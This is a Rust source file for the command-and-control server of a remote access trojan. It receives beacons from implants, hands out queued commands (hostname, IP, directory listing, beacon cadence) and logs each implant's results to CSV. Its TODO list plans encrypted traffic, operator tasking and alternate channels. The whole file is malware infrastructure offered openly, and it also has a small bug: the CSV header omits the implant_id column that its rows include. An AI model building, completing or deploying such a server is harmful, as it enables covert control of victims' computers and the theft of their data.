use remote_access_trojan::rat::RatCommand;
use remote_access_trojan::rat::ask_for_instructions_server::{AskForInstructions, AskForInstructionsServer};
use remote_access_trojan::rat::record_command_result_server::{RecordCommandResult, RecordCommandResultServer};
use remote_access_trojan::rat::{Beacon, Empty, CommandRequest, CommandResponse};
use std::collections::HashMap;
use std::fmt;
use std::fs::OpenOptions;
use std::io::Write;
use std::path::Path;
use tonic::{Request, Response, Status};
use tonic::transport::Server;

/*
TODO
    - encrypt traffic from implant to server
    - server 'help' command
    - alternate communication method(s) between implant and server
    - accept commands from operator to server
    - encrypt traffic from operator to server
*/

// Create a wrapper for RatCommand so I can implement a formatter
#[derive(Debug)]
struct FormattableRatCommand(RatCommand);

// Allow the wrapper struct to print itself as a string
impl fmt::Display for FormattableRatCommand {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{self:?}")
    }
}

// Convert a RatCommand enum variant to the string that the operator typed
fn pretty_print_command(command: RatCommand) -> String {
    let command = FormattableRatCommand(command).to_string();
    let command: Vec<&str> = command.split("(").collect();
    let command = command[command.len() - 1];
    let command: Vec<&str> = command.split(")").collect();
    command[0].to_lowercase().to_string()
}

#[derive(Default)]
pub struct MyAskForInstructions {}

#[tonic::async_trait]
impl AskForInstructions for MyAskForInstructions {
    async fn send(&self, request: Request<Beacon>) -> Result<Response<CommandRequest>, Status> {
        // This will get removed when I have a client
        let fake_commands = HashMap::from([
            (0, (RatCommand::Hostname, "".to_string())),
            (1, (RatCommand::Ip, "".to_string())),
            (2, (RatCommand::Ls, "".to_string())),
            (3, (RatCommand::Cadence, "2".to_string())),
        ]);
        // Get the command number that the implant is requesting
        let command_number: usize = request.into_inner().requested_command.try_into().unwrap();
        // If the command number exists in the server already, send it back to the implant to run
        // Otherwise, send the 'None' command, which tells the implant there is nothing new
        if fake_commands.len() > command_number {
            Ok(Response::new(
                CommandRequest {
                    command: RatCommand::try_into(fake_commands[&command_number].0).unwrap(),
                    arguments: fake_commands[&command_number].1.clone()
                }
            ))
        } else {
            Ok(Response::new(
                CommandRequest {
                    command: RatCommand::try_into(RatCommand::None).unwrap(),
                    arguments:String::from("")
                }
            ))
        }
    }
}

#[derive(Default)]
pub struct MyRecordCommandResult {}

#[tonic::async_trait]
impl RecordCommandResult for MyRecordCommandResult {
    async fn send(&self, request: Request<CommandResponse>) -> Result<Response<Empty>, Status> {
        // Get the response from the implant and prepare it for recording
        let request = request.into_inner();
        let implant_id = request.implant_id;
        let timestamp = request.timestamp;
        let command = pretty_print_command(RatCommand::from_i32(request.command).unwrap());
        let arguments = request.arguments;
        let result = request.result;
        // Determine where the result should be written based on the implant ID
        let filename = format!("./{implant_id}.csv");
        // If the file already exists, the only data we need is in the implant's message
        let mut data = format!("{implant_id},{timestamp},{command},{arguments},{result}");
        // Otherwise, we also need to give the file a header
        if !Path::new(&filename).exists() {
            data = format!("timestamp,command,arguments,result\n{implant_id},{timestamp},{command},{arguments},{result}");
        }
        // Open the file and write the data to it
        let mut file = OpenOptions::new()
                                .create(true)
                                .append(true)
                                .open(filename)
                                .unwrap();
        writeln!(file, "{data}").unwrap();
        // Respond to the implant basically say 'done'
        Ok(Response::new(
            Empty {}
        ))
    }
}


#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Set up the server parameters
    let port = rco_config::LISTENER_PORT;
    let socket = format!("127.0.0.1:{port}").parse()?;

    // Stand up the server and run it
    Server::builder()
        .add_service(AskForInstructionsServer::new(MyAskForInstructions::default()))
        .add_service(RecordCommandResultServer::new(MyRecordCommandResult::default()))
        .serve(socket)
        .await?;

    Ok(())
}